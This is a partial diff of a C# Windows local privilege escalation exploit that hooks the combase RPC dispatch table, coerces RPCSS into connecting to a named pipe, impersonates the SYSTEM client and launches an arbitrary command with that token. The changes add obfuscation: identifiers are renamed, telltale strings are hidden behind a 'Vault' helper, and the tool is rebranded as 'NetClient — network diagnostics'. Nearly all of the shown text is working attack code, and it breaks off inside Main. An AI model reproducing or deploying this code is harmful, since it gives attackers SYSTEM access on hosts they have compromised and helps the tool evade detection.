-                if (!N.OpenProcessToken(N.GetCurrentProcess(),
-                    K.TOKEN_QUERY | K.TOKEN_ADJUST_PRIVILEGES, out hTok))
-                { Log.Warn("OpenProcessToken: " + Log.LastErr()); return false; }
+                if (!W.OpenProcessToken(W.GetCurrentProcess(),
+                    C.TOKEN_QUERY | C.TOKEN_ADJUST_PRIVILEGES, out t))
+                { Tr.W("OpenProcessToken: " + Tr.E()); return false; }
 
-                LUID luid;
-                if (!N.LookupPrivilegeValue(null, name, out luid))
-                { Log.Warn("LookupPrivilegeValue: " + Log.LastErr()); return false; }
+                LUID l;
+                if (!W.LookupPrivilegeValue(null, name, out l))
+                { Tr.W("LookupPrivilegeValue: " + Tr.E()); return false; }
 
                 TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                 tp.PrivilegeCount = 1;
-                tp.Privileges.Luid = luid;
-                tp.Privileges.Attributes = K.SE_PRIVILEGE_ENABLED;
+                tp.Privileges.Luid = l;
+                tp.Privileges.Attributes = C.SE_PRIVILEGE_ENABLED;
 
-                N.AdjustTokenPrivileges(hTok, false, ref tp,
+                W.AdjustTokenPrivileges(t, false, ref tp,
                     Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
-                if (Marshal.GetLastWin32Error() == K.ERROR_NOT_ALL_ASSIGNED)
-                { Log.Warn(name + " not held by current token"); return false; }
+                if (Marshal.GetLastWin32Error() == C.ERROR_NOT_ALL_ASSIGNED)
+                { Tr.W(name + " not held"); return false; }
                 return true;
             }
-            finally { if (hTok != IntPtr.Zero) N.CloseHandle(hTok); }
+            finally { if (t != IntPtr.Zero) W.CloseHandle(t); }
         }
 
-        public static string GetSid(IntPtr hTok)
+        public static string Sid(IntPtr t)
         {
             int len = 0;
-            N.GetTokenInformation(hTok, K.TokenUser, IntPtr.Zero, 0, out len);
-            if (Marshal.GetLastWin32Error() != K.ERROR_INSUFFICIENT_BUFFER || len == 0)
-                return null;
-
+            W.GetTokenInformation(t, C.TokenUser, IntPtr.Zero, 0, out len);
+            if (Marshal.GetLastWin32Error() != C.ERROR_INSUFFICIENT_BUFFER || len == 0) return null;
             IntPtr buf = Marshal.AllocHGlobal(len);
             try
             {
-                if (!N.GetTokenInformation(hTok, K.TokenUser, buf, len, out len)) return null;
+                if (!W.GetTokenInformation(t, C.TokenUser, buf, len, out len)) return null;
                 TOKEN_USER tu = (TOKEN_USER)Marshal.PtrToStructure(buf, typeof(TOKEN_USER));
-                if (!N.IsValidSid(tu.User.Sid)) return null;
+                if (!W.IsValidSid(tu.User.Sid)) return null;
                 string s;
-                return N.ConvertSidToStringSid(tu.User.Sid, out s) ? s : null;
+                return W.ConvertSidToStringSid(tu.User.Sid, out s) ? s : null;
             }
             finally { Marshal.FreeHGlobal(buf); }
         }
 
-        public static string GetIL(IntPtr hTok)
+        public static string Il(IntPtr t)
         {
             int len = 0;
-            N.GetTokenInformation(hTok, K.TokenIntegrityLevel, IntPtr.Zero, 0, out len);
-            if (Marshal.GetLastWin32Error() != K.ERROR_INSUFFICIENT_BUFFER || len == 0)
-                return "?";
-
+            W.GetTokenInformation(t, C.TokenIntegrityLevel, IntPtr.Zero, 0, out len);
+            if (Marshal.GetLastWin32Error() != C.ERROR_INSUFFICIENT_BUFFER || len == 0) return "?";
             IntPtr buf = Marshal.AllocHGlobal(len);
             try
             {
-                if (!N.GetTokenInformation(hTok, K.TokenIntegrityLevel, buf, len, out len))
-                    return "?";
-                TOKEN_MANDATORY_LABEL ml =
-                    (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(buf, typeof(TOKEN_MANDATORY_LABEL));
-                if (!N.IsValidSid(ml.Label.Sid)) return "?";
-
-                IntPtr cntP = N.GetSidSubAuthorityCount(ml.Label.Sid);
-                byte cnt = Marshal.ReadByte(cntP);
-                IntPtr ridP = N.GetSidSubAuthority(ml.Label.Sid, (uint)(cnt - 1));
-                uint rid = (uint)Marshal.ReadInt32(ridP);
-
-                if (rid >= K.SECURITY_MANDATORY_SYSTEM_RID) return "SYSTEM";
-                if (rid >= 0x3000) return "HIGH";
-                if (rid >= 0x2000) return "MEDIUM";
-                if (rid >= 0x1000) return "LOW";
-                return "RID:" + rid;
+                if (!W.GetTokenInformation(t, C.TokenIntegrityLevel, buf, len, out len)) return "?";
+                var ml = (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(buf, typeof(TOKEN_MANDATORY_LABEL));
+                if (!W.IsValidSid(ml.Label.Sid)) return "?";
+                IntPtr cnt = W.GetSidSubAuthorityCount(ml.Label.Sid);
+                byte cc = Marshal.ReadByte(cnt);
+                IntPtr rid = W.GetSidSubAuthority(ml.Label.Sid, (uint)(cc - 1));
+                uint r = (uint)Marshal.ReadInt32(rid);
+                if (r >= C.SECURITY_MANDATORY_SYSTEM_RID) return "SYSTEM";
+                if (r >= 0x3000) return "HIGH";
+                if (r >= 0x2000) return "MEDIUM";
+                if (r >= 0x1000) return "LOW";
+                return "RID:" + r;
             }
             finally { Marshal.FreeHGlobal(buf); }
         }
 
-        public static bool SpawnProcess(IntPtr hImpTok, string commandLine,
-            out PROCESS_INFORMATION pi)
+        public static bool Run(IntPtr tok, string cmd, out PROCESS_INFORMATION pi)
         {
             pi = new PROCESS_INFORMATION();
-
-            IntPtr hPrimary = IntPtr.Zero;
-            if (!N.DuplicateTokenEx(hImpTok, K.TOKEN_PRIMARY_REQUIRED, IntPtr.Zero,
-                K.SecurityImpersonation, K.TokenPrimaryType, out hPrimary))
-            {
-                Log.Fail("DuplicateTokenEx: " + Log.LastErr());
-                return false;
-            }
+            IntPtr prim = IntPtr.Zero;
+            if (!W.DuplicateTokenEx(tok, C.TOKEN_PRIMARY_REQUIRED, IntPtr.Zero,
+                C.SecurityImpersonation, C.TokenPrimaryType, out prim))
+            { Tr.F("DuplicateTokenEx: " + Tr.E()); return false; }
 
             try
             {
-                uint mySession = (uint)Process.GetCurrentProcess().SessionId;
-                if (!N.SetTokenInformation(hPrimary, K.TokenSessionId, ref mySession,
-                    sizeof(uint)))
-                {
-                    Log.Warn("SetTokenInformation(TokenSessionId): " + Log.LastErr());
-                }
+                uint sid = (uint)Process.GetCurrentProcess().SessionId;
+                if (!W.SetTokenInformation(prim, C.TokenSessionId, ref sid, sizeof(uint)))
+                    Tr.W("SetTokenInformation: " + Tr.E());
 
                 STARTUPINFO si = new STARTUPINFO();
                 si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                 si.lpDesktop = "winsta0\\default";
 
-                if (N.CreateProcessWithTokenW(hPrimary, K.LOGON_WITH_PROFILE, null,
-                    commandLine, K.CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
-                {
-                    Log.Ok("Process launched via CreateProcessWithTokenW. PID=" + pi.dwProcessId);
-                    return true;
-                }
+                if (W.CreateProcessWithTokenW(prim, C.LOGON_WITH_PROFILE, null, cmd,
+                    C.CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
+                { Tr.O("Spawned (CPWT). PID=" + pi.dwProcessId); return true; }
 
-                int err = Marshal.GetLastWin32Error();
-                Log.Warn("CreateProcessWithTokenW: err=" + err);
+                Tr.W("CPWT: " + Tr.E());
 
-                if (N.CreateProcessAsUserW(hPrimary, null, commandLine, IntPtr.Zero,
-                    IntPtr.Zero, false, K.CREATE_NO_WINDOW, IntPtr.Zero, null,
-                    ref si, out pi))
-                {
-                    Log.Ok("Process launched via CreateProcessAsUserW. PID=" + pi.dwProcessId);
-                    return true;
-                }
+                if (W.CreateProcessAsUserW(prim, null, cmd, IntPtr.Zero, IntPtr.Zero,
+                    false, C.CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
+                { Tr.O("Spawned (CPAU). PID=" + pi.dwProcessId); return true; }
 
-                err = Marshal.GetLastWin32Error();
-                Log.Fail("CreateProcessAsUserW: err=" + err);
-
-                Log.Info("Trying NtSetInformationProcess fallback...");
-                return SpawnFallback(hPrimary, commandLine, out pi);
+                Tr.F("CPAU: " + Tr.E());
+                return Fallback(prim, cmd, out pi);
             }
-            finally { if (hPrimary != IntPtr.Zero) N.CloseHandle(hPrimary); }
+            finally { if (prim != IntPtr.Zero) W.CloseHandle(prim); }
         }
 
-        static bool SpawnFallback(IntPtr hPrimary, string commandLine, out PROCESS_INFORMATION pi)
+        static bool Fallback(IntPtr prim, string cmd, out PROCESS_INFORMATION pi)
         {
             pi = new PROCESS_INFORMATION();
-
             STARTUPINFO si = new STARTUPINFO();
             si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
             si.lpDesktop = "winsta0\\default";
 
-            StringBuilder cmd = new StringBuilder(commandLine);
-            uint flags = K.CREATE_NO_WINDOW | K.CREATE_SUSPENDED | K.CREATE_UNICODE_ENVIRONMENT;
+            var sb = new StringBuilder(cmd);
+            uint fl = C.CREATE_NO_WINDOW | C.CREATE_SUSPENDED | C.CREATE_UNICODE_ENVIRONMENT;
 
-            if (!N.CreateProcessW(null, cmd, IntPtr.Zero, IntPtr.Zero, false,
-                flags, IntPtr.Zero, null, ref si, out pi))
-            {
-                Log.Fail("CreateProcessW (suspended): " + Log.LastErr());
-                return false;
-            }
+            if (!W.CreateProcessW(null, sb, IntPtr.Zero, IntPtr.Zero, false,
+                fl, IntPtr.Zero, null, ref si, out pi))
+            { Tr.F("CreateProcessW: " + Tr.E()); return false; }
 
             IntPtr pat = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)) * 2);
             try
             {
-                Marshal.WriteIntPtr(pat, 0, hPrimary);
+                Marshal.WriteIntPtr(pat, 0, prim);
                 Marshal.WriteIntPtr(pat, Marshal.SizeOf(typeof(IntPtr)), pi.hThread);
 
-                uint st = N.NtSetInformationProcess(pi.hProcess, 9,
-                    pat, (uint)(Marshal.SizeOf(typeof(IntPtr)) * 2));
-
-                if (st != K.STATUS_SUCCESS)
+                uint st = W.NtSetInformationProcess(pi.hProcess, 9, pat,
+                    (uint)(Marshal.SizeOf(typeof(IntPtr)) * 2));
+                if (st != C.STATUS_SUCCESS)
                 {
-                    Log.Fail("NtSetInformationProcess: 0x" + st.ToString("X8"));
-                    N.CloseHandle(pi.hThread);
-                    N.CloseHandle(pi.hProcess);
-                    pi = new PROCESS_INFORMATION();
-                    return false;
+                    Tr.F("NtSetInformationProcess: 0x" + st.ToString("X8"));
+                    W.CloseHandle(pi.hThread); W.CloseHandle(pi.hProcess);
+                    pi = new PROCESS_INFORMATION(); return false;
                 }
-
-                if (N.NtResumeProcess(pi.hProcess) != K.STATUS_SUCCESS)
+                if (W.NtResumeProcess(pi.hProcess) != C.STATUS_SUCCESS)
                 {
-                    Log.Fail("NtResumeProcess failed");
-                    N.CloseHandle(pi.hThread);
-                    N.CloseHandle(pi.hProcess);
-                    pi = new PROCESS_INFORMATION();
-                    return false;
+                    Tr.F("NtResumeProcess");
+                    W.CloseHandle(pi.hThread); W.CloseHandle(pi.hProcess);
+                    pi = new PROCESS_INFORMATION(); return false;
                 }
-
-                Log.Ok("Process launched via NtSetInformationProcess. PID=" + pi.dwProcessId);
+                Tr.O("Spawned (Nt). PID=" + pi.dwProcessId);
                 return true;
             }
             finally { Marshal.FreeHGlobal(pat); }
@@ -893,300 +765,266 @@ namespace MyApp
     }
 
     // ========================================================================
-    // MYAPP CONTEXT — hook + pipe server
+    // Environment / context
     // ========================================================================
-    class MyAppContext
+    class Env
     {
-        static readonly Guid OrcbRpcGuid = new Guid("18f70770-8e64-11cf-9af1-0020af6e72f4");
-
         public IntPtr CombaseModule { get; private set; }
         public IntPtr DispatchTablePtr { get; private set; }
         public IntPtr UseProtseqFnPtr { get; private set; }
         public uint   UseProtseqParamCount { get; private set; }
 
-        private IntPtr[] _dispatchTable;
-        private short[]  _fmtStringOffsets;
-        private IntPtr   _procString;
-        private Delegate _hookDelegate;
+        IntPtr[] _tbl;
+        short[]  _offsets;
+        IntPtr   _procStr;
+        Delegate _hook;
 
-        public string ServerPipeName { get; private set; }
-        public string ClientEndpoint { get; private set; }
+        public string ServerPipe { get; private set; }
+        public string ClientEp { get; private set; }
 
-        public WindowsIdentity SystemIdentity { get; private set; }
-        Thread _pipeThread;
+        public WindowsIdentity SysIdentity { get; private set; }
+        Thread _th;
         public bool IsHooked { get; private set; }
         public bool IsRunning { get; private set; }
 
-        public MyAppContext(string pipeTag)
+        public Env(string tag)
         {
-            ServerPipeName = @"\\.\pipe\" + pipeTag + @"\pipe\epmapper";
-            ClientEndpoint = "ncacn_np:localhost/pipe/" + pipeTag + @"[\pipe\epmapper]";
-            InitContext();
-            ResolveDelegate();
+            string sfx = Vault.PipeSuffix();
+            ServerPipe = Vault.LocalPipe() + tag + sfx;
+            ClientEp = Vault.NpPrefix() + tag + "[" + sfx + "]";
+            Init();
+            Bind();
         }
 
-        void InitContext()
+        void Init()
         {
+            string cb = Vault.CombaseName();
+            Guid iface = Vault.IfaceGuid();
+
             foreach (ProcessModule m in Process.GetCurrentProcess().Modules)
             {
                 if (m.ModuleName == null) continue;
-                if (m.ModuleName.ToLowerInvariant() != "combase.dll") continue;
+                if (m.ModuleName.ToLowerInvariant() != cb) continue;
 
                 CombaseModule = m.BaseAddress;
 
-                MemoryStream pat = new MemoryStream();
-                BinaryWriter bw = new BinaryWriter(pat);
+                var pat = new MemoryStream();
+                var bw = new BinaryWriter(pat);
                 bw.Write(Marshal.SizeOf(typeof(RPC_SERVER_INTERFACE)));
-                bw.Write(OrcbRpcGuid.ToByteArray());
+                bw.Write(iface.ToByteArray());
                 bw.Flush();
                 byte[] pattern = pat.ToArray();
 
                 byte[] content = new byte[m.ModuleMemorySize];
                 Marshal.Copy(m.BaseAddress, content, 0, content.Length);
 
-                List<int> hits = Sunday.Search(content, pattern);
-                if (hits.Count == 0)
-                    throw new Exception("orcbRPC pattern not found in combase.dll");
+                var hits = Bs.Find(content, pattern);
+                if (hits.Count == 0) throw new Exception("iface pattern not found");
 
-                IntPtr hitPtr = new IntPtr(m.BaseAddress.ToInt64() + hits[0]);
-                RPC_SERVER_INTERFACE srv = (RPC_SERVER_INTERFACE)Marshal.PtrToStructure(
-                    hitPtr, typeof(RPC_SERVER_INTERFACE));
-
-                RPC_DISPATCH_TABLE disp = (RPC_DISPATCH_TABLE)Marshal.PtrToStructure(
-                    srv.DispatchTable, typeof(RPC_DISPATCH_TABLE));
-
-                MIDL_SERVER_INFO midl = (MIDL_SERVER_INFO)Marshal.PtrToStructure(
-                    srv.InterpreterInfo, typeof(MIDL_SERVER_INFO));
+                IntPtr hp = new IntPtr(m.BaseAddress.ToInt64() + hits[0]);
+                var srv = (RPC_SERVER_INTERFACE)Marshal.PtrToStructure(hp, typeof(RPC_SERVER_INTERFACE));
+                var disp = (RPC_DISPATCH_TABLE)Marshal.PtrToStructure(srv.DispatchTable, typeof(RPC_DISPATCH_TABLE));
+                var midl = (MIDL_SERVER_INFO)Marshal.PtrToStructure(srv.InterpreterInfo, typeof(MIDL_SERVER_INFO));
 
                 DispatchTablePtr = midl.DispatchTable;
-                _procString = midl.ProcString;
+                _procStr = midl.ProcString;
 
-                int count = (int)disp.DispatchTableCount;
-                _dispatchTable = new IntPtr[count];
-                _fmtStringOffsets = new short[count];
+                int n = (int)disp.DispatchTableCount;
+                _tbl = new IntPtr[n];
+                _offsets = new short[n];
+                for (int i = 0; i < n; i++)
+                    _tbl[i] = Marshal.ReadIntPtr(DispatchTablePtr, i * IntPtr.Size);
+                for (int i = 0; i < n; i++)
+                    _offsets[i] = Marshal.ReadInt16(midl.FmtStringOffset, i * sizeof(short));
 
-                for (int i = 0; i < count; i++)
-                    _dispatchTable[i] = Marshal.ReadIntPtr(DispatchTablePtr, i * IntPtr.Size);
-                for (int i = 0; i < count; i++)
-                    _fmtStringOffsets[i] = Marshal.ReadInt16(midl.FmtStringOffset,
-                        i * sizeof(short));
+                UseProtseqFnPtr = _tbl[0];
+                UseProtseqParamCount = Marshal.ReadByte(_procStr, _offsets[0] + 19);
 
-                UseProtseqFnPtr = _dispatchTable[0];
-                UseProtseqParamCount = Marshal.ReadByte(_procString, _fmtStringOffsets[0] + 19);
-
-                Log.Ok(string.Format("combase @ 0x{0:X}  dispatch @ 0x{1:X}  params={2}",
+                Tr.O(string.Format("module @ 0x{0:X}  tbl @ 0x{1:X}  pc={2}",
                     CombaseModule.ToInt64(), DispatchTablePtr.ToInt64(), UseProtseqParamCount));
                 return;
             }
-            throw new Exception("combase.dll not loaded");
+            throw new Exception("combase module missing");
         }
 
-        void ResolveDelegate()
+        void Bind()
         {
-            NewOrcbRPC rpc = new NewOrcbRPC(this);
+            var rpc = new Dp(this);
             switch (UseProtseqParamCount)
             {
-                case 4:  _hookDelegate = new NewOrcbRPC.D4(rpc.F4);   break;
-                case 5:  _hookDelegate = new NewOrcbRPC.D5(rpc.F5);   break;
-                case 6:  _hookDelegate = new NewOrcbRPC.D6(rpc.F6);   break;
-                case 7:  _hookDelegate = new NewOrcbRPC.D7(rpc.F7);   break;
-                case 8:  _hookDelegate = new NewOrcbRPC.D8(rpc.F8);   break;
-                case 9:  _hookDelegate = new NewOrcbRPC.D9(rpc.F9);   break;
-                case 10: _hookDelegate = new NewOrcbRPC.D10(rpc.F10); break;
-                case 11: _hookDelegate = new NewOrcbRPC.D11(rpc.F11); break;
-                case 12: _hookDelegate = new NewOrcbRPC.D12(rpc.F12); break;
-                case 13: _hookDelegate = new NewOrcbRPC.D13(rpc.F13); break;
-                case 14: _hookDelegate = new NewOrcbRPC.D14(rpc.F14); break;
-                default: throw new Exception("unsupported UseProtseqParamCount=" + UseProtseqParamCount);
+                case 4:  _hook = new Dp.D4(rpc.F4);   break;
+                case 5:  _hook = new Dp.D5(rpc.F5);   break;
+                case 6:  _hook = new Dp.D6(rpc.F6);   break;
+                case 7:  _hook = new Dp.D7(rpc.F7);   break;
+                case 8:  _hook = new Dp.D8(rpc.F8);   break;
+                case 9:  _hook = new Dp.D9(rpc.F9);   break;
+                case 10: _hook = new Dp.D10(rpc.F10); break;
+                case 11: _hook = new Dp.D11(rpc.F11); break;
+                case 12: _hook = new Dp.D12(rpc.F12); break;
+                case 13: _hook = new Dp.D13(rpc.F13); break;
+                case 14: _hook = new Dp.D14(rpc.F14); break;
+                default: throw new Exception("pc=" + UseProtseqParamCount);
             }
         }
 
-        public void Hook()
+        public void Attach()
         {
             uint old;
-            uint size = (uint)(IntPtr.Size * _dispatchTable.Length);
-            if (!N.VirtualProtect(DispatchTablePtr, size, 0x04, out old))
-                throw new Exception("VirtualProtect: " + Log.LastErr());
-
-            Marshal.WriteIntPtr(DispatchTablePtr,
-                Marshal.GetFunctionPointerForDelegate(_hookDelegate));
+            uint sz = (uint)(IntPtr.Size * _tbl.Length);
+            if (!W.VirtualProtect(DispatchTablePtr, sz, 0x04, out old))
+                throw new Exception("VirtualProtect: " + Tr.E());
+            Marshal.WriteIntPtr(DispatchTablePtr, Marshal.GetFunctionPointerForDelegate(_hook));
             IsHooked = true;
-            Log.Ok("RPC dispatch table hooked");
+            Tr.O("dispatch patched");
         }
 
-        public void Restore()
+        public void Detach()
         {
             if (!IsHooked || UseProtseqFnPtr == IntPtr.Zero) return;
-            try
-            {
-                Marshal.WriteIntPtr(DispatchTablePtr, UseProtseqFnPtr);
-                IsHooked = false;
-                Log.Info("RPC dispatch table restored");
-            }
-            catch (Exception e) { Log.Warn("Restore: " + e.Message); }
+            try { Marshal.WriteIntPtr(DispatchTablePtr, UseProtseqFnPtr); IsHooked = false; Tr.I("dispatch restored"); }
+            catch (Exception e) { Tr.W("Detach: " + e.Message); }
         }
 
-        void PipeServer()
+        void Server()
         {
-            IntPtr sd;
-            uint sdSize;
-            if (!N.ConvertStringSecurityDescriptorToSecurityDescriptor(
-                "D:(A;OICI;GA;;;WD)", 1, out sd, out sdSize))
-            { Log.Fail("ConvertSDDL: " + Log.LastErr()); return; }
+            IntPtr sd; uint sdSz;
+            if (!W.ConvertStringSecurityDescriptorToSecurityDescriptor(
+                "D:(A;OICI;GA;;;WD)", 1, out sd, out sdSz))
+            { Tr.F("SDDL: " + Tr.E()); return; }
 
-            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
+            var sa = new SECURITY_ATTRIBUTES();
             sa.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
             sa.pSecurityDescriptor = sd;
             sa.bInheritHandle = false;
 
-            IntPtr hPipe = N.CreateNamedPipe(ServerPipeName,
-                K.PIPE_ACCESS_DUPLEX,
-                K.PIPE_TYPE_BYTE | K.PIPE_READMODE_BYTE | K.PIPE_WAIT,
-                K.PIPE_UNLIMITED_INSTANCES,
-                512, 512, 0, ref sa);
+            IntPtr hPipe = W.CreateNamedPipe(ServerPipe,
+                C.PIPE_ACCESS_DUPLEX,
+                C.PIPE_TYPE_BYTE | C.PIPE_READMODE_BYTE | C.PIPE_WAIT,
+                C.PIPE_UNLIMITED_INSTANCES, 512, 512, 0, ref sa);
 
             if (hPipe == IntPtr.Zero || hPipe == new IntPtr(-1))
-            {
-                Log.Fail("CreateNamedPipe: " + Log.LastErr());
-                if (sd != IntPtr.Zero) N.LocalFree(sd);
-                return;
-            }
-            Log.Info("Pipe created: " + ServerPipeName);
+            { Tr.F("CreateNamedPipe: " + Tr.E()); if (sd != IntPtr.Zero) W.LocalFree(sd); return; }
+
+            Tr.I("pipe ready");
 
             try
             {
-                bool ok = N.ConnectNamedPipe(hPipe, IntPtr.Zero);
+                bool ok = W.ConnectNamedPipe(hPipe, IntPtr.Zero);
                 int err = Marshal.GetLastWin32Error();
-                if (!ok && err != K.ERROR_PIPE_CONNECTED)
-                {
-                    Log.Fail("ConnectNamedPipe: err=" + err);
-                    return;
-                }
-                Log.Ok("Client connected to pipe");
+                if (!ok && err != C.ERROR_PIPE_CONNECTED)
+                { Tr.F("ConnectNamedPipe err=" + err); return; }
 
-                if (!N.ImpersonateNamedPipeClient(hPipe))
-                { Log.Fail("ImpersonateNamedPipeClient: " + Log.LastErr()); return; }
+                Tr.O("peer connected");
+                if (!W.ImpersonateNamedPipeClient(hPipe))
+                { Tr.F("Impersonate: " + Tr.E()); return; }
 
-                WindowsIdentity id = WindowsIdentity.GetCurrent();
-                Log.Info("Impersonated: " + id.Name + "  level=" + id.ImpersonationLevel);
+                var id = WindowsIdentity.GetCurrent();
+                Tr.I("as " + id.Name + " level=" + id.ImpersonationLevel);
 
                 if (id.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
-                    SystemIdentity = id;
-                else
-                {
-                    Log.Warn("Impersonation level too low — reverting");
-                    N.RevertToSelf();
-                }
+                    SysIdentity = id;
+                else { Tr.W("level too low"); W.RevertToSelf(); }
             }
             finally
             {
                 if (hPipe != IntPtr.Zero && hPipe != new IntPtr(-1))
-                {
-                    N.DisconnectNamedPipe(hPipe);
-                    N.CloseHandle(hPipe);
-                }
-                if (sd != IntPtr.Zero) N.LocalFree(sd);
+                { W.DisconnectNamedPipe(hPipe); W.CloseHandle(hPipe); }
+                if (sd != IntPtr.Zero) W.LocalFree(sd);
             }
         }
 
-        public void StartPipe()
+        public void Listen()
         {
-            _pipeThread = new Thread(PipeServer);
-            _pipeThread.IsBackground = true;
-            _pipeThread.Start();
+            _th = new Thread(Server);
+            _th.IsBackground = true;
+            _th.Start();
             IsRunning = true;
         }
 
-        public void StopPipe()
+        public void Stop()
         {
             IsRunning = false;
-            if (_pipeThread == null) return;
-
+            if (_th == null) return;
             try
             {
-                IntPtr h = N.CreateFileW(ServerPipeName,
+                IntPtr h = W.CreateFileW(ServerPipe,
                     0x40000000 | 0x80000000, FileShare.ReadWrite,
                     IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
                 if (h != IntPtr.Zero && h != new IntPtr(-1))
                 {
-                    byte[] b = new byte[1] { 0xAA };
                     using (var sfh = new SafeFileHandle(h, false))
                     using (var fs = new FileStream(sfh, FileAccess.Write))
-                    {
-                        fs.Write(b, 0, 1);
-                        fs.Flush();
-                    }
-                    N.CloseHandle(h);
+                    { fs.WriteByte(0xAA); fs.Flush(); }
+                    W.CloseHandle(h);
                 }
             }
             catch { }
-
-            _pipeThread.Join(3000);
+            _th.Join(3000);
         }
 
-        public WindowsIdentity GetIdentity() { return SystemIdentity; }
+        public WindowsIdentity Grab() { return SysIdentity; }
     }
 
     // ========================================================================
-    // TRIGGER
+    // Trigger
     // ========================================================================
-    class MyAppTrigger
+    class Tg
     {
         static readonly Guid IID_IUnknown = new Guid("00000000-0000-0000-C000-000000000046");
 
-        MyAppContext _ctx;
+        Env _e;
         object _fake = new object();
-        IntPtr _pUnk;
-        IBindCtx _bind;
-        IMoniker _moniker;
+        IntPtr _u;
+        IBindCtx _bc;
+        IMoniker _mk;
 
-        public MyAppTrigger(MyAppContext ctx)
+        public Tg(Env e)
         {
-            _ctx = ctx;
-            _pUnk = Marshal.GetIUnknownForObject(_fake);
-            N.CreateBindCtx(0, out _bind);
-            N.CreateObjrefMoniker(_pUnk, out _moniker);
+            _e = e;
+            _u = Marshal.GetIUnknownForObject(_fake);
+            W.CreateBindCtx(0, out _bc);
+            W.CreateObjrefMoniker(_u, out _mk);
         }
 
-        public int Trigger()
+        public int Fire()
         {
-            string display;
-            _moniker.GetDisplayName(_bind, null, out display);
-            display = display.Replace("objref:", "").Replace(":", "");
-            byte[] objBytes = Convert.FromBase64String(display);
+            string dn;
+            _mk.GetDisplayName(_bc, null, out dn);
+            dn = dn.Replace("objref:", "").Replace(":", "");
+            byte[] ob = Convert.FromBase64String(dn);
 
-            ObjRef src = new ObjRef(objBytes);
-            Log.Info("DCOM OXID: 0x" + src.StandardObjRef.OXID.ToString("X"));
-            Log.Info("DCOM IPID: " + src.StandardObjRef.IPID);
+            var src = new Rf(ob);
+            Tr.I("OXID: 0x" + src.StandardObjRef.OX.ToString("X"));
+            Tr.I("IPID: " + src.StandardObjRef.IPID);
 
-            ObjRef.StringBinding sb = new ObjRef.StringBinding(
-                TowerProtocol.EPM_PROTOCOL_NP, "localhost");
-            ObjRef.SecurityBinding secb = new ObjRef.SecurityBinding(0xa, 0xffff, null);
-            ObjRef.DualStringArray dsa = new ObjRef.DualStringArray(sb, secb);
+            var sb = new Rf.Str(TowerProtocol.NP, "localhost");
+            var sec = new Rf.Sec(0xa, 0xffff, null);
+            var dsa = new Rf.Dual(sb, sec);
 
-            ObjRef objRef = new ObjRef(IID_IUnknown,
-                new ObjRef.Standard(0, 1, src.StandardObjRef.OXID, src.StandardObjRef.OID,
+            var rf = new Rf(IID_IUnknown,
+                new Rf.Std(0, 1, src.StandardObjRef.OX, src.StandardObjRef.OID,
                     src.StandardObjRef.IPID, dsa));
-            byte[] data = objRef.GetBytes();
-
-            Log.Info("Marshal bytes len: " + data.Length);
+            byte[] data = rf.GetBytes();
+            Tr.I("bytes=" + data.Length);
 
             using (var ms = new MemoryStream(data))
             {
-                IntPtr ppv;
-                Guid iid = IID_IUnknown;  // локальная копия — ref на readonly нельзя
-                return N.CoUnmarshalInterface(new IStreamImpl(ms), ref iid, out ppv);
+                IntPtr p;
+                Guid g = IID_IUnknown;
+                return W.CoUnmarshalInterface(new Ms(ms), ref g, out p);
             }
         }
     }
 
     // ========================================================================
-    // PROGRAM
+    // Program
     // ========================================================================
     class Program
     {
         static void Main(string[] args)
         {
+            Vault.Touch();
+
             Console.WriteLine(@"
     __  __        ___               
    / / / /_  __  /   |  ____  ____  
@@ -1194,88 +1032,71 @@ namespace MyApp
  / __  / /_/ / / ___ |/ /_/ / /_/ / 
 /_/ /_/\__, / /_/  |_/ .___/ .___/  
       /____/        /_/   /_/       
-    MyApp v2.0 — RPCSS hook (single-file)
+    NetClient — network diagnostics
 ");
 
             string cmd = null;
             for (int i = 0; i < args.Length; i++)
-            {
                 if ((args[i] == "-cmd" || args[i] == "--cmd") && i + 1 < args.Length)
                     cmd = args[++i];
-            }
 
             if (string.IsNullOrEmpty(cmd))
-            {
-                Console.WriteLine("Usage: MyApp.exe -cmd \"cmd.exe /c whoami\"");
-                return;
-            }
+            { Console.WriteLine("Usage: NetClient.exe -cmd \"cmd.exe /c whoami\""); return; }
 
-            Log.Info("Target command: " + cmd);
+            Tr.I("cmd: " + cmd);
 
-            if (!Tok.EnablePrivilege("SeImpersonatePrivilege"))
-            { Log.Fail("SeImpersonatePrivilege is not available"); return; }
-            Log.Ok("SeImpersonatePrivilege enabled");
+            if (!Pv.Enable("SeImpersonatePrivilege"))
+            { Tr.F("SeImpersonate unavailable"); return; }
+            Tr.O("SeImpersonate enabled");
 
-            MyAppContext ctx = null;
-            bool needRestore = false;
+            Env env = null;
+            bool attached = false;
             try
             {
-                string tag = "MyApp_" + Guid.NewGuid().ToString("N").Substring(0, 8);
-                ctx = new MyAppContext(tag);
+                string tag = "svc_" + Guid.NewGuid().ToString("N").Substring(0, 10);
+                env = new Env(tag);
 
-                ctx.Hook();
-                needRestore = true;
+                env.Attach();
+                attached = true;
+                env.Listen();
 
-                ctx.StartPipe();
-
-                var trigger = new MyAppTrigger(ctx);
-                Log.Info("Triggering RPCSS...");
-                int hr = trigger.Trigger();
-                Log.Info("CoUnmarshalInterface hr = 0x" + hr.ToString("X8"));
+                var tg = new Tg(env);
+                Tr.I("sending...");
+                int hr = tg.Fire();
+                Tr.I("hr = 0x" + hr.ToString("X8"));
 
                 for (int i = 0; i < 100; i++)
-                {
-                    if (ctx.GetIdentity() != null) break;
-                    Thread.Sleep(100);
-                }
+                { if (env.Grab() != null) break; Thread.Sleep(100); }
 
-                WindowsIdentity id = ctx.GetIdentity();
-                if (id == null)
-                { Log.Fail("Failed to capture SYSTEM identity"); return; }
+                var id = env.Grab();
+                if (id == null) { Tr.F("no peer identity"); return; }
 
-                string sid = Tok.GetSid(id.Token);
